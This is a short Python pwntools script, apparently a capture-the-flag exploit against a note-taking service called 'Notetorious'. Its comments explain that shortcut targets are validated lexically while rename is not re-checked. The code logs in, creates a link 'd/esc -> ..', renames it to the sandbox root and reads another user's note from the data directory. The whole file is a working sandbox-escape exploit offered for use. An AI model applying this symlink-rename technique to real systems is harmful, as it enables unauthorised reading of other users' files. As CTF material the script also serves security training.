#!/usr/bin/env python3
# Notetorious symlink-rename sandbox escape.
# shortcut creation validates the link target lexically, but `rename` does not
# re-validate. Create `d/esc -> ..` (valid: `..` from inside `d/` is the sandbox
# root), then rename it up to the sandbox root so `esc` now resolves to
# /notetorious/data, letting us read vputin's real note.
import sys, os
from pwn import remote, context
context.log_level='error'
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 17003))
io=remote(HOST,PORT)
io.recvuntil(b"Username: "); io.sendline(b"pwner")
io.recvuntil(b"Password: "); io.sendline(b"pwner")
io.recvuntil(b"[>] ")
def cmd(c):
    io.sendline(c.encode()); return io.recvuntil(b"[>] ")
cmd("folder d")
cmd("shortcut d/esc ..")          # d/esc -> ".."  (resolves to sandbox root, valid)
cmd("rename d/esc esc")           # move link to sandbox root; target "." -> data dir
io.sendline(b"display esc/vputin/nuclear_launch_codes")
print(io.recvuntil(b"[>] ",timeout=3).decode(errors='replace'))
